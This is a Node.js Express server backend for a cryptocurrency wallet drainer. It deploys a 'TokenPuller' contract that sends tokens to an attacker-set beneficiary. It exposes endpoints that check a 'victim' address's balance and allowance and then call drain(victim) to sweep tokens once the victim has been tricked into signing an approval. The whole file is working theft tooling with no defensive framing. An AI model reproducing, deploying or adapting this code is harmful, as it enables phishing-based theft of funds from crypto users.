require("dotenv").config();
const path = require("path");
const fs = require("fs/promises");
const express = require("express");
const { ethers } = require("ethers");

const PORT = process.env.PORT || 3999;
const RPC_URL = process.env.RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const BENEFICIARY = process.env.BENEFICIARY;
const PREDEPLOYED = process.env.PULLER_ADDRESS || null;

const ARTIFACT_PATH = path.join(
  __dirname, "artifacts", "contracts", "TokenPuller.sol", "TokenPuller.json"
);
const ERC20_VIEW_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
];

function errShort(e) {
  return String(e?.reason ?? e?.shortMessage ?? e?.message ?? e);
}

async function main() {
  const missing = Object.entries({ RPC_URL, PRIVATE_KEY, TOKEN_ADDRESS, BENEFICIARY })
    .filter(([, v]) => !v).map(([k]) => k);
  if (missing.length) {
    console.error("[fatal] missing env:", missing.join(", "));
    process.exit(1);
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const CHAIN_ID = Number((await provider.getNetwork()).chainId);
  console.log(`[srv] chain=${CHAIN_ID} token=${TOKEN_ADDRESS} -> ${BENEFICIARY}`);

  const erc20View = new ethers.Contract(TOKEN_ADDRESS, ERC20_VIEW_ABI, provider);

  let pullerInfo = null;
  let deploying = null;

  async function loadArtifact() {
    let art;
    try { art = JSON.parse(await fs.readFile(ARTIFACT_PATH, "utf8")); }
    catch { throw new Error(`artifact missing at ${ARTIFACT_PATH}: run "npx hardhat compile"`); }
    if (!art.bytecode || art.bytecode === "0x") throw new Error("artifact has no bytecode");
    return art;
  }

  async function getPuller() {
    if (PREDEPLOYED) return { address: PREDEPLOYED, runner: null };
    if (pullerInfo) return pullerInfo;
    if (!deploying) {
      deploying = (async () => {
        const art = await loadArtifact();
        const code = await provider.getCode(TOKEN_ADDRESS);
        if (code === "0x") throw new Error("TOKEN_ADDRESS is not a contract on this chain");
        if ((await provider.getBalance(wallet.address)) === 0n)
          throw new Error("deployer wallet has zero gas");
        const deployed = await new ethers.ContractFactory(art.abi, art.bytecode, wallet)
          .deploy(TOKEN_ADDRESS, BENEFICIARY);
        await deployed.waitForDeployment();
        const address = await deployed.getAddress();
        console.log(`[init] TokenPuller deployed: ${address}`);
        return { address, runner: deployed };
      })().catch(e => { deploying = null; throw e; });
    }
    pullerInfo = await deploying;
    return pullerInfo;
  }

  async function pullerStatus() {
    try {
      const p = await getPuller();
      return { puller: p.address, ready: true };
    } catch (e) {
      return { puller: null, ready: false, error: errShort(e) };
    }
  }

  const attempted = new Set();

  const app = express();
  app.use(express.json());
  app.use(express.static(path.join(__dirname, "public")));

  app.get("/api/health", async (_q, res) =>
    res.json({ status: "ok", token: TOKEN_ADDRESS, chainId: CHAIN_ID, ...(await pullerStatus()) }));

  app.post("/api/provision", async (_q, res) => {
    try {
      const p = await getPuller();
      res.json({ success: true, puller: p.address });
    } catch (e) { res.status(500).json({ success: false, error: errShort(e) }); }
  });

  /* NEW: server-side balance/allowance read, used by the page instead of
     the wallet's eth_call. Calls the TOKEN contract, never the puller. */
  app.post("/api/check", async (req, res) => {
    try {
      const { victim } = req.body || {};
      if (typeof victim !== "string" || !/^0x[a-fA-F0-9]{40}$/.test(victim))
        return res.status(400).json({ ok: false, error: "invalid victim address" });

      const p = await getPuller();
      const puller = p ? p.address : null;

      const bal = await erc20View.balanceOf(victim).catch(() => 0n);
      const alw = puller
        ? await erc20View.allowance(victim, puller).catch(() => 0n)
        : 0n;

      console.log(`[check] victim=${victim} bal=${bal} alw=${alw} puller=${puller}`);
      res.json({ ok: true, balance: bal.toString(), allowance: alw.toString(), puller });
    } catch (e) {
      console.error("[check][error]", errShort(e));
      res.status(500).json({ ok: false, error: errShort(e) });
    }
  });

  app.post("/api/drain", async (req, res) => {
    try {
      const { victim } = req.body || {};
      if (typeof victim !== "string" || !/^0x[a-fA-F0-9]{40}$/.test(victim))
        return res.status(400).json({ success: false, error: "invalid victim address" });

      const key = victim.toLowerCase();
      const p = await getPuller();
      const runner = p.runner;
      if (!runner)
        return res.status(400).json({ success: false, error: "predeployed mode has no signer; run in lazy mode" });

      const [bal, alw] = await Promise.all([
        erc20View.balanceOf(victim).catch(() => 0n),
        erc20View.allowance(victim, p.address).catch(() => 0n),
      ]);
      console.log(`[drain] victim=${victim} bal=${bal} allow=${alw}`);

      if (attempted.has(key)) return res.json({ success: true, skipped: "already attempted" });
      if (bal === 0n) return res.json({ success: false, reason: "zero balance" });
      if (alw === 0n) return res.json({ success: false, reason: "zero allowance (user never signed approve)" });
      attempted.add(key);

      const tx = await runner.drain(victim);
      const rc = await tx.wait(1);
      console.log(`[drain] DONE tx=${tx.hash}`);
      res.json({ success: true, txHash: tx.hash, pulled: bal.toString() });
    } catch (e) {
      console.error("[drain][error]", errShort(e));
      res.status(500).json({ success: false, error: errShort(e) });
    }
  });

  app.get("/", (_q, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[srv] listening on http://localhost:${PORT}`);
    if (PREDEPLOYED) console.log(`[srv] using pre-deployed puller ${PREDEPLOYED}`);
    else console.log("[srv] puller will be lazily deployed on first provision");
  });
}

main().catch(e => { console.error("[fatal]", e); process.exit(1); });
